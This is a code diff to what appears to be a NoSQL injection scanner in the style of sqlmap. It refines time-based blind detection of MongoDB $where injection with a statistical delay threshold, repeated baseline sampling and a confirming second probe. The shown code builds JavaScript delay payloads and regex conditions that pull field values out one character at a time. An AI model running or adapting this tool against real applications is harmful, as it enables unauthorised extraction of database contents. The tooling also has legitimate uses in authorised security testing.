@@ -41,6 +41,12 @@ _CHARSET_FULL = _CHARSET_DEFAULT + "?/\\|~^()[]{}<>:;,'\"=`"
 # Calibration samples for the noise model.
 _SAMPLES = 4
 
+# Time-based blind: statistical model for the delay oracle (sqlmap-style).
+_TIME_SAMPLES = 8          # baseline response-time samples
+_TIME_STDEV_COEFF = 4      # threshold = mean + COEFF*stdev (clamped below the delay)
+_TIME_MIN_MARGIN = 0.20    # seconds; floor so tiny stdev still leaves headroom
+_TIME_WARN_STDEV = 0.50    # seconds; warn that the network is too jittery
+
 # Status codes that usually mean "blocked" (WAF/ratelimit), not injection.
 _BLOCKING = {403, 406, 429, 501}
 
@@ -954,6 +960,18 @@ def discover_fields(ctx, method, base_url, vector, fields_literal, findings):
     return []
 
 
+def _time_threshold(times, delay_secs):
+    # Statistical delay oracle: threshold = mean + COEFF*stdev (sqlmap-style),
+    # floored so tiny stdev still leaves headroom and clamped below the induced
+    # delay so a real sleep clearly crosses it.  Warns on a jittery network.
+    m = sum(times) / len(times)
+    sd = (sum((t - m) ** 2 for t in times) / len(times)) ** 0.5
+    if sd > _TIME_WARN_STDEV:
+        print("  [time] high baseline jitter (stdev %.2fs); raise --timeDelay if results look flaky." % sd)
+    margin = min(max(_TIME_STDEV_COEFF * sd, _TIME_MIN_MARGIN), delay_secs * 0.5)
+    return m + margin
+
+
 def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, inject_fields=None):
     # Confirm a $where injection purely by response time: inject an unconditional
     # delay; if it slows (and a no-delay control stays fast), it's time-based.
@@ -962,10 +980,11 @@ def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, injec
     for vector in vectors:
         try:
             base = [_send(ctx, method, base_url, vector,
-                          {n: ("lit", _rand()) for n in fields_literal}).elapsed for _ in range(4)]
+                          {n: ("lit", _rand()) for n in fields_literal}).elapsed for _ in range(_TIME_SAMPLES)]
         except requests.RequestException:
             continue
-        thr = max(base) + secs * 0.5
+        thr = _time_threshold(base, secs)
+        bmean = sum(base) / len(base)
         for field in targets:
             for tlabel, tmpl in _WHERE_TEMPLATES:
                 for elabel, efmt in _DELAY_EXPRS:
@@ -985,8 +1004,8 @@ def _detect_time(ctx, method, base_url, fields_literal, vectors, delay_ms, injec
                             "vector": vector,
                             "label": "$where %s/%s (time:%s)" % (field, tlabel, elabel),
                             "spec": spec,
-                            "reasons": ["response %.2fs vs baseline %.2fs (induced %dms delay)"
-                                        % (t2, max(base), delay_ms)],
+                            "reasons": ["response %.2fs vs baseline %.2fs +/- (induced %dms delay)"
+                                        % (t2, bmean, delay_ms)],
                             "strong": True, "status": 0, "length": 0,
                             "where": {"field": field, "template": tmpl, "time": True,
                                       "delay": delay_ms, "threshold": thr, "efmt": efmt},
@@ -1010,7 +1029,9 @@ def _where_time_is_true(ctx, method, base_url, vector, fields_literal, inj_field
         cond = "this.%s!=null && /%s/.test(String(this.%s))" % (target, jsp, target)
         js = "(%s) ? %s : 0" % (cond, delay_js)   # delay only when the char matches
         try:
-            return probe(js) > thr
+            if probe(js) <= thr:
+                return False
+            return probe(js) > thr     # confirm a slept reading to reject one-off jitter spikes
         except requests.RequestException:
             return False
     return is_true
